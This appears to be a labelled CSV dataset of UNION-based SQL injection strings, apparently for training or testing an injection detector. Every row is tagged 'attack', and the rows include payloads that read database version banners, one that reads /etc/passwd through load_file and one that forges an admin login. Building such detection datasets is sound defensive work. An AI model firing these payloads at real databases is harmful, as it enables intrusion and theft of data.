label,payload,family
attack," select * from users where id  =  '1' or @ @1  =  1 union select 1,version  (    )   -- 1'",union
attack," select * from users where id  =  '1' or ||/1  =  1 union select 1,version  (    )   -- 1'",union
attack," select * from users where id  =  '1' or \.<\ union select 1,@@VERSION -- 1'",union
attack," select * from users where id  =  '1' %!<@ union select 1,version  (    )   -- 1'",union
attack," select * from users where id  =  '1' union select +\.,@@VERSION -- 1'",union
attack," select * from users where id  =  '1' union select $*$,@@VERSION -- 1'",union
attack," select * from users where id  =  '1' or $ 1  =  1 union select 1,@@VERSION -- 1'",union
attack," select * from users where id  =  '1' or \<\ union select 1,@@VERSION -- 1'",union
attack," select * from users where id  =  1 ||1 union select null,banner from v$version where rownum  =  1 -- 1",union
attack," select * from users where id  =  1 +  (  1  )   union select null,banner from v$version where rownum  =  1 -- 1",union
attack," select * from users where id  =  '1' union select   (  \.  )  ,@@VERSION -- 1'",union
attack," select * from users where id  =  1 or 1#"". union select null,version  (    )   -- 1",union
attack," select * from users where id  =  1 union select 1,banner from v$version where rownum  =  1 -- 1",union
attack," select * from users where id  =  1 union select @ $_,version  (    )   -- 1",union
attack," select * from users where id  =  1.<@$ union select 1,version  (    )   -- 1",union
attack," select * from users where id  =  1 *1 union select null,banner from v$version where rownum  =  1 -- 1",union
attack," select * from users where id  =  1 or 1#"". union select 'a',version  (    )   -- 1",union
attack," select * from users where id  =  1 or 1#""; union select null,version  (    )   -- 1",union
attack," select * from users where id  =  1 *1 union select 1,banner from v$version where rownum  =  1 -- 1",union
attack," select * from users where id  =  '1' union select   (  \  )  ,@@VERSION -- 1'",union
attack," select * from users where id  =  1 or 1#""{ union select null,version  (    )   -- 1",union
attack,"1234 "" AND 1  =  0 UNION ALL SELECT ""admin"", ""81dc9bdb52d04dc20036dbd8313ed055",union
attack," select * from users where id  =  1 or $+<1 union select 1,@@VERSION -- 1",union
attack," select * from users where id  =  1 ||1 union select 1,banner from v$version where rownum  =  1 -- 1",union
attack," select * from users where id  =  1 <@$$ union select 1,version  (    )   -- 1",union
attack," select * from users where id  =  1 or 1#""@ union select 'a',version  (    )   -- 1",union
attack," select * from users where id  =  1 union select .1_,version  (    )   -- 1",union
attack," select * from users where id  =  1 <1## union select 1,version  (    )   -- 1",union
attack," union select 1,load_file  (  '/etc/passwd'  )  ,1,1,1;",union
attack," select * from users where id  =  1 or \+<$ union select 1,@@VERSION -- 1",union
attack," select * from users where id  =  1 +  (  \  )   union select null,@@VERSION -- 1",union
attack," select * from users where id  =  '1' or $ .  =  1 union select 1,@@VERSION -- 1'",union
attack," select * from users where id  =  1<@.. union select 1,version  (    )   -- 1",union
attack," select * from users where id  =  '1' + @ 1 union select 1,version  (    )   -- 1'",union
attack,union select * from users where login   =   char ...,union
attack," select * from users where id  =  1 union select 1||@,version  (    )   -- 1",union
attack," select * from users where id  =  '1' or """"<@ union select 1,version  (    )   -- 1'",union
attack," select * from users where id  =  '1' ||1 union select 1,banner from v$version where rownum  =  1 -- 1'",union
attack," select * from users where id  =  1 or \<   =  1 union select 1,@@VERSION -- 1",union
attack," select * from users where id  =  1 union select 1<@$,version  (    )   -- 1",union
attack," select * from users where id  =  1 *\ union select null,@@VERSION -- 1",union
attack," select * from users where id  =  '1' or !<@ union select 1,version  (    )   -- 1'",union
attack," select * from users where id  =  '1'<@.. union select 1,version  (    )   -- 1'",union
attack," select * from users where id  =  1 <@.$ union select 1,version  (    )   -- 1",union
attack," select * from users where id  =  1 or $ .  =  1 union select 1,@@VERSION -- 1",union
attack," select * from users where id  =  1 +$ . union select null,@@VERSION -- 1",union
attack," select * from users where id  =  1 union select +!<1,version  (    )   -- 1",union
attack," select * from users where id  =  1 union select !<1,version  (    )   -- 1",union
